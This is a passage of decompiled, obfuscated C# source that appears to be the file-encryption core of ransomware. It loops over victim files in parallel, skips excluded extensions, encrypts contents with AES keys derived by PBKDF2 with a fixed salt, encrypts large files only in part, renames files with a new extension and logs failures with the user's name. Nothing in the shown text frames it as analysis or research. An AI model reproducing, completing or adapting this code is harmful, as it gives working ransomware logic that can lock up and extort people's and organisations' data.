					}
				}
				oODUpNadLmFxS.Add(item);
				if (!ytgqYFajIsYkRHo.Contains(Path.GetDirectoryName(item)))
				{
					ytgqYFajIsYkRHo.Add(Path.GetDirectoryName(item));
				}
				try
				{
					FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (CWgqQYxkECI == getString_0(107396809) && fileStream.Length > Convert.ToInt32(NzKGGrtTBpkeMR) * 1024 * 1024 && !list3.Contains(text))
					{
						if (baVPzfInuLOtD == getString_0(107396809))
						{
							foreach (string item2 in vAvIzfBtHKG)
							{
								if (item.ToLower().EndsWith(item2) && ilWxgAZLeD == getString_0(107396809))
								{
									if (Convert.ToInt32(ZCRgCrsIaCud) * 1024 * 1024 > fileStream.Length)
									{
										try
										{
											vnvqegDZgMFTThUQ.EtLrisjAZLbg(getString_0(107391985), getString_0(107391980), getString_0(107391935), item);
										}
										catch
										{
										}
									}
								}
								else if (item.ToLower().EndsWith(item2) && ilWxgAZLeD == getString_0(107397066))
								{
									try
									{
										vnvqegDZgMFTThUQ.EtLrisjAZLbg(getString_0(107391985), getString_0(107391980), getString_0(107391935), item);
									}
									catch
									{
									}
								}
							}
						}
						fileStream.Dispose();
						byte[] byte_ = vbCIKVbhqx.BYkQAgVUBLyxo(item, Convert.ToInt32(NzKGGrtTBpkeMR) * 1024 * 1024);
						byte[] oNXixkHbkQIFSeb = vbCIKVbhqx.sSRSaFyGDhu(byte_, Convert.FromBase64String(string_4), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
						vbCIKVbhqx.IEfuzgSYhKmrIk(item, oNXixkHbkQIFSeb);
						if (string_2 != getString_0(107388155))
						{
							File.Move(item, item + string_2);
						}
					}
					else if (string_2 != getString_0(107388155))
					{
						cQCkoNhIPGXCNk(item, item + string_2, jBAOFpxRKVADf);
					}
					else
					{
						cQCkoNhIPGXCNk(item, item + getString_0(107388150), jBAOFpxRKVADf);
					}
				}
				catch (Exception)
				{
				}
				IL_039b:;
			}
		}
	}

	public static void eUdjecBKcnd(List<string> list_0, string[] string_0, string string_1, string[] string_2, string string_3)
	{
		mnXXSXntfqSpCE.FYMTYsvedWj CS_0024_003C_003E8__locals0 = new mnXXSXntfqSpCE();
		CS_0024_003C_003E8__locals0.PAntdrlTZkgXTD = list_0;
		CS_0024_003C_003E8__locals0.OnwOnmkBWIVal = string_1;
		CS_0024_003C_003E8__locals0.MNbgFyZffSKl = string_2;
		CS_0024_003C_003E8__locals0.DUKuBNRvAydYG = string_3;
		CS_0024_003C_003E8__locals0.EvgOSsAktNPa = new List<string> { getString_0(107391872) };
		if (ToPvNEVWQmmpbo == getString_0(107397066))
		{
			Parallel.ForEach(string_0, delegate(string string_0)
			{
				foreach (string item in CS_0024_003C_003E8__locals0.PAntdrlTZkgXTD)
				{
					if (CS_0024_003C_003E8__locals0.MNbgFyZffSKl.Length != 0)
					{
						string[] mNbgFyZffSKl2 = CS_0024_003C_003E8__locals0.MNbgFyZffSKl;
						int num2 = 0;
						while (num2 < mNbgFyZffSKl2.Length)
						{
							string value2 = mNbgFyZffSKl2[num2];
							if (!item.EndsWith(value2))
							{
								num2++;
								continue;
							}
							goto IL_09a3;
						}
					}
					try
					{
						if (item.EndsWith(CS_0024_003C_003E8__locals0.OnwOnmkBWIVal))
						{
							goto IL_09a3;
						}
					}
					catch (Exception)
					{
						goto IL_09a3;
					}
					if (item.EndsWith(string_0) && !oODUpNadLmFxS.Contains(item))
					{
						if (xziKmMkpqKW == mnXXSXntfqSpCE.getString_0(107396828))
						{
							try
							{
								if (OVAWlGSBxtgO.eWzXoGEEKK(item))
								{
									OVAWlGSBxtgO.lbpBdeyOdYV(item);
								}
							}
							catch
							{
							}
						}
						oODUpNadLmFxS.Add(item);
						if (!ytgqYFajIsYkRHo.Contains(Path.GetDirectoryName(item)))
						{
							ytgqYFajIsYkRHo.Add(Path.GetDirectoryName(item));
						}
						qVCNNzzGmwuooDZ(item);
						try
						{
							new GyjxqaSPQe().ZQZXBbcsBMnvz(item);
						}
						catch
						{
						}
						try
						{
							using FileStream fileStream2 = new FileStream(item, FileMode.Open, FileAccess.Write);
							if (!fileStream2.CanWrite)
							{
								try
								{
									if (DcTmJYuRqmJcpcY)
									{
										Console.WriteLine(mnXXSXntfqSpCE.getString_0(107405495) + item + mnXXSXntfqSpCE.getString_0(107405930) + new FileInfo(item).Length + mnXXSXntfqSpCE.getString_0(107405941));
										Console.WriteLine(mnXXSXntfqSpCE.getString_0(107405900));
									}
								}
								catch
								{
								}
								xxpegTfogDffK(JqDJfBiOyDaAy(mnXXSXntfqSpCE.getString_0(107405827)), mnXXSXntfqSpCE.getString_0(107390924) + item + mnXXSXntfqSpCE.getString_0(107390924) + JqDJfBiOyDaAy(mnXXSXntfqSpCE.getString_0(107405770)) + mnXXSXntfqSpCE.getString_0(107390924) + Environment.UserName + mnXXSXntfqSpCE.getString_0(107390924) + JqDJfBiOyDaAy(mnXXSXntfqSpCE.getString_0(107405785)));
							}
						}
						catch (Exception ex16)
						{
							if (rcFXGcWApOJB)
							{
								try
								{
									File.AppendAllText(nPLbuhisBzmHoeaY, mnXXSXntfqSpCE.getString_0(107388938) + item + mnXXSXntfqSpCE.getString_0(107405760) + ex16.Message + mnXXSXntfqSpCE.getString_0(107396264));
								}
								catch (Exception)
								{
								}
							}
							continue;
						}
						try
						{
							try
							{
								if (new FileInfo(item).Length != 0L)
								{
									goto end_IL_02cd;
								}
								goto end_IL_02cd_2;
								end_IL_02cd:;
							}
							catch (Exception ex18)
							{
								if (rcFXGcWApOJB)
								{
									try
									{
										File.AppendAllText(nPLbuhisBzmHoeaY, mnXXSXntfqSpCE.getString_0(107388938) + item + mnXXSXntfqSpCE.getString_0(107405135) + ex18.Message + mnXXSXntfqSpCE.getString_0(107396264));
									}
									catch (Exception)
									{
									}
								}
								CBbCjcYRLmYL++;
								goto end_IL_02cd_2;
							}
							if (!(CWgqQYxkECI == mnXXSXntfqSpCE.getString_0(107396828)) || new FileInfo(item).Length <= Convert.ToInt32(NzKGGrtTBpkeMR) * 1024 * 1024 || CS_0024_003C_003E8__locals0.EvgOSsAktNPa.Contains(string_0))
							{
								if (oVVBsGsoBvRKjE)
								{
									CS_0024_003C_003E8__locals0.OnwOnmkBWIVal = nmBFzgaiOADgSVhq + CS_0024_003C_003E8__locals0.OnwOnmkBWIVal;
								}
								string text5 = EyxHIzBgCEnzgn.JXgFRQquWqtcRNm(32);
								string text6 = mnXXSXntfqSpCE.getString_0(107391891);
								text6 = (JweQHtvwAVLtP ? EyxHIzBgCEnzgn.tpIepiJRhhm() : mnXXSXntfqSpCE.getString_0(107391891));
								string s3 = pQtTIepfVunG.MmnVKLBAZcnOVX(text5 + text6);
								byte[] bytes3 = Encoding.ASCII.GetBytes(s3);
								if (CS_0024_003C_003E8__locals0.OnwOnmkBWIVal != mnXXSXntfqSpCE.getString_0(107388174))
								{
									if (!XTugcnpxmKWX)
									{
										if (!JweQHtvwAVLtP)
										{
											UgscNpyaZraAU(item, item + CS_0024_003C_003E8__locals0.OnwOnmkBWIVal, jBAOFpxRKVADf);
										}
										else
										{
											UgscNpyaZraAU(item, item + CS_0024_003C_003E8__locals0.OnwOnmkBWIVal, Convert.FromBase64String(text5));
										}
									}
									else
									{
										try
										{
											if (!JweQHtvwAVLtP)
											{
												zGYgJOabDUZgZoa(item, item + CS_0024_003C_003E8__locals0.OnwOnmkBWIVal, jBAOFpxRKVADf, Convert.FromBase64String(sCJKcfPXYjG));
											}
											else
											{
												zGYgJOabDUZgZoa(item, item + CS_0024_003C_003E8__locals0.OnwOnmkBWIVal, Convert.FromBase64String(text5), Convert.FromBase64String(text6));
											}
										}
										catch (Exception ex20)
										{
											if (rcFXGcWApOJB)
											{
												try
												{
													File.AppendAllText(nPLbuhisBzmHoeaY, mnXXSXntfqSpCE.getString_0(107388938) + item + mnXXSXntfqSpCE.getString_0(107388192) + ex20.Message + mnXXSXntfqSpCE.getString_0(107396264));
												}
												catch (Exception)
												{
												}
											}
											CBbCjcYRLmYL++;
											try
											{
												File.Move(item + CS_0024_003C_003E8__locals0.OnwOnmkBWIVal, item);
											}
											catch (Exception)
											{
											}
											goto end_IL_02cd_2;
										}
									}
								}
								else if (!XTugcnpxmKWX)
								{
									if (!JweQHtvwAVLtP)
									{
										UgscNpyaZraAU(item, item + mnXXSXntfqSpCE.getString_0(107388169), jBAOFpxRKVADf);
									}
									else
									{
										UgscNpyaZraAU(item, item + mnXXSXntfqSpCE.getString_0(107388169), Convert.FromBase64String(text5));
									}
								}
								else
								{
									try
									{
										if (!JweQHtvwAVLtP)
										{
											zGYgJOabDUZgZoa(item, item, jBAOFpxRKVADf, Convert.FromBase64String(sCJKcfPXYjG));
										}
										else
										{
											zGYgJOabDUZgZoa(item, item, Convert.FromBase64String(text5), Convert.FromBase64String(text6));
										}
									}
									catch (Exception ex23)
									{
										if (rcFXGcWApOJB)
										{
											try
											{
												File.AppendAllText(nPLbuhisBzmHoeaY, mnXXSXntfqSpCE.getString_0(107388938) + item + mnXXSXntfqSpCE.getString_0(107388192) + ex23.Message + mnXXSXntfqSpCE.getString_0(107396264));
											}
											catch (Exception)
											{
											}
										}
										CBbCjcYRLmYL++;
										goto end_IL_02cd_2;
									}
								}
								if (JweQHtvwAVLtP)
								{
									if (CS_0024_003C_003E8__locals0.OnwOnmkBWIVal != mnXXSXntfqSpCE.getString_0(107388174))
									{
										mHyPlqBfINJNrTmd(item + CS_0024_003C_003E8__locals0.OnwOnmkBWIVal, bytes3);
									}
									else
									{
										mHyPlqBfINJNrTmd(item, bytes3);
									}
								}
								goto IL_09a3;
							}
							CS_0024_003C_003E8__locals0 = new mnXXSXntfqSpCE.ybRaFCfdAcS();
							CS_0024_003C_003E8__locals0.tBUKpZGtZOxvzqk = CS_0024_003C_003E8__locals0;
							try
							{
								if (CS_0024_003C_003E8__locals0.OnwOnmkBWIVal != mnXXSXntfqSpCE.getString_0(107388174))
								{
									if (oVVBsGsoBvRKjE)
									{
										CS_0024_003C_003E8__locals0.OnwOnmkBWIVal = nmBFzgaiOADgSVhq + CS_0024_003C_003E8__locals0.OnwOnmkBWIVal;
									}
									File.Move(item, item + CS_0024_003C_003E8__locals0.OnwOnmkBWIVal);
								}
							}
							catch (Exception ex25)
							{
								if (rcFXGcWApOJB)
								{
									try
									{
										File.AppendAllText(nPLbuhisBzmHoeaY, mnXXSXntfqSpCE.getString_0(107388938) + item + mnXXSXntfqSpCE.getString_0(107405074) + ex25.Message + mnXXSXntfqSpCE.getString_0(107396264));
									}
									catch (Exception)
									{
									}
								}
								CBbCjcYRLmYL++;
								goto end_IL_02cd_2;
							}
							CS_0024_003C_003E8__locals0.SscAMTfCJZFIj = mnXXSXntfqSpCE.getString_0(107391891);
							if (CS_0024_003C_003E8__locals0.OnwOnmkBWIVal != mnXXSXntfqSpCE.getString_0(107388174))
							{
								CS_0024_003C_003E8__locals0.SscAMTfCJZFIj = item + CS_0024_003C_003E8__locals0.OnwOnmkBWIVal;
							}
							else
							{
								CS_0024_003C_003E8__locals0.SscAMTfCJZFIj = item;
							}
							if (baVPzfInuLOtD == mnXXSXntfqSpCE.getString_0(107396828))
							{
								Thread thread2 = new Thread((ThreadStart)delegate
								{
									foreach (string item2 in vAvIzfBtHKG)
									{
										if (CS_0024_003C_003E8__locals0.SscAMTfCJZFIj.ToLower().EndsWith(item2 + CS_0024_003C_003E8__locals0.tBUKpZGtZOxvzqk.OnwOnmkBWIVal) && ilWxgAZLeD == mnXXSXntfqSpCE.ybRaFCfdAcS.getString_0(107396831))
										{
											if (Convert.ToInt32(ZCRgCrsIaCud) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.SscAMTfCJZFIj).Length)
											{
												try
												{
													vnvqegDZgMFTThUQ.EtLrisjAZLbg(mnXXSXntfqSpCE.ybRaFCfdAcS.getString_0(107392007), mnXXSXntfqSpCE.ybRaFCfdAcS.getString_0(107392002), mnXXSXntfqSpCE.ybRaFCfdAcS.getString_0(107391957), CS_0024_003C_003E8__locals0.SscAMTfCJZFIj);
												}
												catch
												{
												}
											}
										}
										else if (CS_0024_003C_003E8__locals0.SscAMTfCJZFIj.ToLower().EndsWith(item2) && ilWxgAZLeD == mnXXSXntfqSpCE.ybRaFCfdAcS.getString_0(107397088))
										{
											try
											{
												vnvqegDZgMFTThUQ.EtLrisjAZLbg(mnXXSXntfqSpCE.ybRaFCfdAcS.getString_0(107392007), mnXXSXntfqSpCE.ybRaFCfdAcS.getString_0(107392002), mnXXSXntfqSpCE.ybRaFCfdAcS.getString_0(107391957), CS_0024_003C_003E8__locals0.SscAMTfCJZFIj);
											}
											catch
											{
											}
										}
									}
								});
								thread2.Priority = ThreadPriority.Normal;
								thread2.IsBackground = false;
								thread2.Start();
							}
							string text7 = EyxHIzBgCEnzgn.JXgFRQquWqtcRNm(32);
							string text8 = mnXXSXntfqSpCE.getString_0(107391891);
							text8 = (JweQHtvwAVLtP ? EyxHIzBgCEnzgn.tpIepiJRhhm() : mnXXSXntfqSpCE.getString_0(107391891));
							string s4 = pQtTIepfVunG.MmnVKLBAZcnOVX(text7 + text8);
							byte[] bytes4 = Encoding.ASCII.GetBytes(s4);
							byte[] array2 = null;
							byte[] byte_2 = vbCIKVbhqx.BYkQAgVUBLyxo(CS_0024_003C_003E8__locals0.SscAMTfCJZFIj, Convert.ToInt32(NzKGGrtTBpkeMR) * 1024 * 1024);
							if (vbCIKVbhqx.IEfuzgSYhKmrIk(oNXixkHbkQIFSeb: (!BJyvjcvspWj) ? (JweQHtvwAVLtP ? vbCIKVbhqx.sSRSaFyGDhu(byte_2, Convert.FromBase64String(text7), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : vbCIKVbhqx.sSRSaFyGDhu(byte_2, Convert.FromBase64String(CS_0024_003C_003E8__locals0.DUKuBNRvAydYG), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (JweQHtvwAVLtP ? MVtRUvNrdgwG.ELBkKiLWwNhvzh(byte_2, Convert.FromBase64String(text7), Convert.FromBase64String(text8)) : MVtRUvNrdgwG.ELBkKiLWwNhvzh(byte_2, Convert.FromBase64String(CS_0024_003C_003E8__locals0.DUKuBNRvAydYG), Convert.FromBase64String(sCJKcfPXYjG))), GBvLgTwuHXdjy: CS_0024_003C_003E8__locals0.SscAMTfCJZFIj, oZzmHOGHcgTH: bytes4))
							{
								goto IL_09a3;
							}
							try
							{
								File.Move(item + CS_0024_003C_003E8__locals0.OnwOnmkBWIVal, item);
							}
							catch (Exception)
							{
							}
							end_IL_02cd_2:;
						}
						catch (Exception)
						{
							goto IL_09a3;
						}
					}
					continue;
					IL_09a3:
					CS_0024_003C_003E8__locals0.PAntdrlTZkgXTD.Remove(item);
				}
			});
			return;
		}
		Parallel.ForEach(CS_0024_003C_003E8__locals0.PAntdrlTZkgXTD, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new mnXXSXntfqSpCE.FYMTYsvedWj();
			CS_0024_003C_003E8__locals0.tBUKpZGtZOxvzqk = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.mYcUYPSeirgm = string_0;
			if (CS_0024_003C_003E8__locals0.MNbgFyZffSKl.Length != 0)
			{
				string[] mNbgFyZffSKl = CS_0024_003C_003E8__locals0.MNbgFyZffSKl;
				int num = 0;
				while (num < mNbgFyZffSKl.Length)
				{
					string value = mNbgFyZffSKl[num];
					if (!CS_0024_003C_003E8__locals0.mYcUYPSeirgm.EndsWith(value))
					{
						num++;
						continue;
					}
					goto IL_0a6b;
				}
			}
			try
			{
				if (CS_0024_003C_003E8__locals0.mYcUYPSeirgm.EndsWith(CS_0024_003C_003E8__locals0.OnwOnmkBWIVal))
				{
					goto IL_0a6b;
				}
			}
			catch (Exception)
			{
				goto IL_0a6b;
			}
			if (!oODUpNadLmFxS.Contains(CS_0024_003C_003E8__locals0.mYcUYPSeirgm))
			{
				if (xziKmMkpqKW == mnXXSXntfqSpCE.getString_0(107396828))
				{
					try
					{
						if (OVAWlGSBxtgO.eWzXoGEEKK(CS_0024_003C_003E8__locals0.mYcUYPSeirgm))
						{
							OVAWlGSBxtgO.lbpBdeyOdYV(CS_0024_003C_003E8__locals0.mYcUYPSeirgm);
						}
					}
					catch
					{
					}
				}
				oODUpNadLmFxS.Add(CS_0024_003C_003E8__locals0.mYcUYPSeirgm);
				if (!ytgqYFajIsYkRHo.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.mYcUYPSeirgm)))
				{
					ytgqYFajIsYkRHo.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.mYcUYPSeirgm));
				}
				qVCNNzzGmwuooDZ(CS_0024_003C_003E8__locals0.mYcUYPSeirgm);
				try
				{
					new GyjxqaSPQe().ZQZXBbcsBMnvz(CS_0024_003C_003E8__locals0.mYcUYPSeirgm);
				}
				catch
				{
				}
				try
				{
					using FileStream fileStream = new FileStream(CS_0024_003C_003E8__locals0.mYcUYPSeirgm, FileMode.Open, FileAccess.Write);
					if (!fileStream.CanWrite)
					{
						try
						{
							if (DcTmJYuRqmJcpcY)
							{
								Console.WriteLine(mnXXSXntfqSpCE.getString_0(107405495) + CS_0024_003C_003E8__locals0.mYcUYPSeirgm + mnXXSXntfqSpCE.getString_0(107405930) + new FileInfo(CS_0024_003C_003E8__locals0.mYcUYPSeirgm).Length + mnXXSXntfqSpCE.getString_0(107405941));
								Console.WriteLine(mnXXSXntfqSpCE.getString_0(107405900));
							}
						}
						catch
						{
						}
						xxpegTfogDffK(JqDJfBiOyDaAy(mnXXSXntfqSpCE.getString_0(107405827)), mnXXSXntfqSpCE.getString_0(107390924) + CS_0024_003C_003E8__locals0.mYcUYPSeirgm + mnXXSXntfqSpCE.getString_0(107390924) + JqDJfBiOyDaAy(mnXXSXntfqSpCE.getString_0(107405770)) + mnXXSXntfqSpCE.getString_0(107390924) + Environment.UserName + mnXXSXntfqSpCE.getString_0(107390924) + JqDJfBiOyDaAy(mnXXSXntfqSpCE.getString_0(107405785)));
					}
				}
				catch (Exception ex2)
				{
					if (rcFXGcWApOJB)
					{
						try
						{
							File.AppendAllText(nPLbuhisBzmHoeaY, mnXXSXntfqSpCE.getString_0(107388938) + CS_0024_003C_003E8__locals0.mYcUYPSeirgm + mnXXSXntfqSpCE.getString_0(107405760) + ex2.Message + mnXXSXntfqSpCE.getString_0(107396264));
							return;
						}
						catch (Exception)
						{
							return;
						}
					}
					return;
				}
				try
				{
					try
					{
						if (new FileInfo(CS_0024_003C_003E8__locals0.mYcUYPSeirgm).Length != 0L)
						{
							goto end_IL_031d;
						}
						goto end_IL_031d_2;
						end_IL_031d:;
					}
					catch (Exception ex4)
					{
						if (rcFXGcWApOJB)
						{
							try
							{
								File.AppendAllText(nPLbuhisBzmHoeaY, mnXXSXntfqSpCE.getString_0(107388938) + CS_0024_003C_003E8__locals0.mYcUYPSeirgm + mnXXSXntfqSpCE.getString_0(107405135) + ex4.Message + mnXXSXntfqSpCE.getString_0(107396264));
							}
							catch (Exception)
							{
							}
						}
						CBbCjcYRLmYL++;
						goto end_IL_031d_2;
					}
					if (CWgqQYxkECI == mnXXSXntfqSpCE.getString_0(107396828) && new FileInfo(CS_0024_003C_003E8__locals0.mYcUYPSeirgm).Length > Convert.ToInt32(NzKGGrtTBpkeMR) * 1024 * 1024)
					{
						try
						{
							if (CS_0024_003C_003E8__locals0.OnwOnmkBWIVal != mnXXSXntfqSpCE.getString_0(107388174))
							{
								if (oVVBsGsoBvRKjE)
								{
									CS_0024_003C_003E8__locals0.OnwOnmkBWIVal = nmBFzgaiOADgSVhq + CS_0024_003C_003E8__locals0.OnwOnmkBWIVal;
								}
								File.Move(CS_0024_003C_003E8__locals0.mYcUYPSeirgm, CS_0024_003C_003E8__locals0.mYcUYPSeirgm + CS_0024_003C_003E8__locals0.OnwOnmkBWIVal);
							}
						}
						catch (Exception ex6)
						{
							if (rcFXGcWApOJB)
							{
								try
								{
									File.AppendAllText(nPLbuhisBzmHoeaY, mnXXSXntfqSpCE.getString_0(107388938) + CS_0024_003C_003E8__locals0.mYcUYPSeirgm + mnXXSXntfqSpCE.getString_0(107405074) + ex6.Message + mnXXSXntfqSpCE.getString_0(107396264));
								}
								catch (Exception)
								{
								}
							}
							CBbCjcYRLmYL++;
							return;
						}
						if (CS_0024_003C_003E8__locals0.OnwOnmkBWIVal != mnXXSXntfqSpCE.getString_0(107388174))
						{
							CS_0024_003C_003E8__locals0.mYcUYPSeirgm += CS_0024_003C_003E8__locals0.OnwOnmkBWIVal;
						}
						if (baVPzfInuLOtD == mnXXSXntfqSpCE.getString_0(107396828))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item3 in vAvIzfBtHKG)
								{
									if (CS_0024_003C_003E8__locals0.mYcUYPSeirgm.ToLower().EndsWith(item3 + CS_0024_003C_003E8__locals0.tBUKpZGtZOxvzqk.OnwOnmkBWIVal) && ilWxgAZLeD == mnXXSXntfqSpCE.FYMTYsvedWj.getString_0(107396834))
									{
										if (Convert.ToInt32(ZCRgCrsIaCud) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.mYcUYPSeirgm).Length)
										{
											try
											{
												vnvqegDZgMFTThUQ.EtLrisjAZLbg(mnXXSXntfqSpCE.FYMTYsvedWj.getString_0(107392010), mnXXSXntfqSpCE.FYMTYsvedWj.getString_0(107392005), mnXXSXntfqSpCE.FYMTYsvedWj.getString_0(107391960), CS_0024_003C_003E8__locals0.mYcUYPSeirgm);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.mYcUYPSeirgm.ToLower().EndsWith(item3) && ilWxgAZLeD == mnXXSXntfqSpCE.FYMTYsvedWj.getString_0(107397091))
									{
										try
										{
											vnvqegDZgMFTThUQ.EtLrisjAZLbg(mnXXSXntfqSpCE.FYMTYsvedWj.getString_0(107392010), mnXXSXntfqSpCE.FYMTYsvedWj.getString_0(107392005), mnXXSXntfqSpCE.FYMTYsvedWj.getString_0(107391960), CS_0024_003C_003E8__locals0.mYcUYPSeirgm);
										}
										catch
										{
										}
									}
								}
							});
							thread.IsBackground = false;
							thread.Priority = ThreadPriority.Normal;
							thread.Start();
						}
						string text = EyxHIzBgCEnzgn.JXgFRQquWqtcRNm(32);
						string text2 = mnXXSXntfqSpCE.getString_0(107391891);
						text2 = (JweQHtvwAVLtP ? EyxHIzBgCEnzgn.tpIepiJRhhm() : mnXXSXntfqSpCE.getString_0(107391891));
						string s = pQtTIepfVunG.MmnVKLBAZcnOVX(text + text2);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						byte[] array = null;
						byte[] byte_ = vbCIKVbhqx.BYkQAgVUBLyxo(CS_0024_003C_003E8__locals0.mYcUYPSeirgm, Convert.ToInt32(NzKGGrtTBpkeMR) * 1024 * 1024);
						if (!vbCIKVbhqx.IEfuzgSYhKmrIk(oNXixkHbkQIFSeb: (!BJyvjcvspWj) ? (JweQHtvwAVLtP ? vbCIKVbhqx.sSRSaFyGDhu(byte_, Convert.FromBase64String(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : vbCIKVbhqx.sSRSaFyGDhu(byte_, Convert.FromBase64String(CS_0024_003C_003E8__locals0.DUKuBNRvAydYG), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (JweQHtvwAVLtP ? MVtRUvNrdgwG.ELBkKiLWwNhvzh(byte_, Convert.FromBase64String(text), Convert.FromBase64String(text2)) : MVtRUvNrdgwG.ELBkKiLWwNhvzh(byte_, Convert.FromBase64String(CS_0024_003C_003E8__locals0.DUKuBNRvAydYG), Convert.FromBase64String(sCJKcfPXYjG))), GBvLgTwuHXdjy: CS_0024_003C_003E8__locals0.mYcUYPSeirgm, oZzmHOGHcgTH: bytes))
						{
							try
							{
								File.Move(CS_0024_003C_003E8__locals0.mYcUYPSeirgm + CS_0024_003C_003E8__locals0.OnwOnmkBWIVal, CS_0024_003C_003E8__locals0.mYcUYPSeirgm);
								return;
							}
							catch (Exception)
							{
								return;
							}
						}
					}
					else
					{
						if (oVVBsGsoBvRKjE)
						{
							CS_0024_003C_003E8__locals0.OnwOnmkBWIVal = nmBFzgaiOADgSVhq + CS_0024_003C_003E8__locals0.OnwOnmkBWIVal;
						}
						string text3 = EyxHIzBgCEnzgn.JXgFRQquWqtcRNm(32);
						string text4 = mnXXSXntfqSpCE.getString_0(107391891);
						text4 = (JweQHtvwAVLtP ? EyxHIzBgCEnzgn.tpIepiJRhhm() : mnXXSXntfqSpCE.getString_0(107391891));
						string s2 = pQtTIepfVunG.MmnVKLBAZcnOVX(text3 + text4);
						byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
						if (CS_0024_003C_003E8__locals0.OnwOnmkBWIVal != mnXXSXntfqSpCE.getString_0(107388174))
						{
							if (!XTugcnpxmKWX)
							{
								if (!JweQHtvwAVLtP)
								{
									UgscNpyaZraAU(CS_0024_003C_003E8__locals0.mYcUYPSeirgm, CS_0024_003C_003E8__locals0.mYcUYPSeirgm + CS_0024_003C_003E8__locals0.OnwOnmkBWIVal, jBAOFpxRKVADf);
								}
								else
								{
									UgscNpyaZraAU(CS_0024_003C_003E8__locals0.mYcUYPSeirgm, CS_0024_003C_003E8__locals0.mYcUYPSeirgm + CS_0024_003C_003E8__locals0.OnwOnmkBWIVal, Convert.FromBase64String(text3));
								}
							}
							else
							{
								try
								{
									if (!JweQHtvwAVLtP)
									{
										zGYgJOabDUZgZoa(CS_0024_003C_003E8__locals0.mYcUYPSeirgm, CS_0024_003C_003E8__locals0.mYcUYPSeirgm + CS_0024_003C_003E8__locals0.OnwOnmkBWIVal, jBAOFpxRKVADf, Convert.FromBase64String(sCJKcfPXYjG));
									}
									else
									{
										zGYgJOabDUZgZoa(CS_0024_003C_003E8__locals0.mYcUYPSeirgm, CS_0024_003C_003E8__locals0.mYcUYPSeirgm + CS_0024_003C_003E8__locals0.OnwOnmkBWIVal, Convert.FromBase64String(text3), Convert.FromBase64String(text4));
									}
								}
								catch (Exception ex9)
								{
									if (rcFXGcWApOJB)
									{
										try
										{
											File.AppendAllText(nPLbuhisBzmHoeaY, mnXXSXntfqSpCE.getString_0(107388938) + CS_0024_003C_003E8__locals0.mYcUYPSeirgm + mnXXSXntfqSpCE.getString_0(107388192) + ex9.Message + mnXXSXntfqSpCE.getString_0(107396264));
										}
										catch (Exception)
										{
										}
									}
									CBbCjcYRLmYL++;
									try
									{
										File.Move(CS_0024_003C_003E8__locals0.mYcUYPSeirgm + CS_0024_003C_003E8__locals0.OnwOnmkBWIVal, CS_0024_003C_003E8__locals0.mYcUYPSeirgm);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
						}
						else if (!XTugcnpxmKWX)
						{
							if (!JweQHtvwAVLtP)
							{
								UgscNpyaZraAU(CS_0024_003C_003E8__locals0.mYcUYPSeirgm, CS_0024_003C_003E8__locals0.mYcUYPSeirgm + mnXXSXntfqSpCE.getString_0(107388169), jBAOFpxRKVADf);
							}
							else
							{
								UgscNpyaZraAU(CS_0024_003C_003E8__locals0.mYcUYPSeirgm, CS_0024_003C_003E8__locals0.mYcUYPSeirgm + mnXXSXntfqSpCE.getString_0(107388169), Convert.FromBase64String(text3));
							}
						}
						else
						{
							try
							{
								if (!JweQHtvwAVLtP)
								{
									zGYgJOabDUZgZoa(CS_0024_003C_003E8__locals0.mYcUYPSeirgm, CS_0024_003C_003E8__locals0.mYcUYPSeirgm, jBAOFpxRKVADf, Convert.FromBase64String(sCJKcfPXYjG));
								}
								else
								{
									zGYgJOabDUZgZoa(CS_0024_003C_003E8__locals0.mYcUYPSeirgm, CS_0024_003C_003E8__locals0.mYcUYPSeirgm, Convert.FromBase64String(text3), Convert.FromBase64String(text4));
								}
							}
							catch (Exception ex12)
							{
								if (rcFXGcWApOJB)
								{
									try
									{
										File.AppendAllText(nPLbuhisBzmHoeaY, mnXXSXntfqSpCE.getString_0(107388938) + CS_0024_003C_003E8__locals0.mYcUYPSeirgm + mnXXSXntfqSpCE.getString_0(107388192) + ex12.Message + mnXXSXntfqSpCE.getString_0(107396264));
									}
									catch (Exception)
									{
									}
								}
								CBbCjcYRLmYL++;
								return;
							}
						}
						if (JweQHtvwAVLtP)
						{
							if (CS_0024_003C_003E8__locals0.OnwOnmkBWIVal != mnXXSXntfqSpCE.getString_0(107388174))
							{
								mHyPlqBfINJNrTmd(CS_0024_003C_003E8__locals0.mYcUYPSeirgm + CS_0024_003C_003E8__locals0.OnwOnmkBWIVal, bytes2);
							}
							else
							{
								mHyPlqBfINJNrTmd(CS_0024_003C_003E8__locals0.mYcUYPSeirgm, bytes2);
							}
						}
					}
					end_IL_031d_2:;
				}
				catch (Exception)
				{
				}
			}
			goto IL_0a6b;
			IL_0a6b:
			CS_0024_003C_003E8__locals0.PAntdrlTZkgXTD.Remove(CS_0024_003C_003E8__locals0.mYcUYPSeirgm);
		});
	}

	private static void cQCkoNhIPGXCNk(string string_0, string string_1, byte[] byte_0)
	{
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			FileStream fileStream = new FileStream(string_1, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
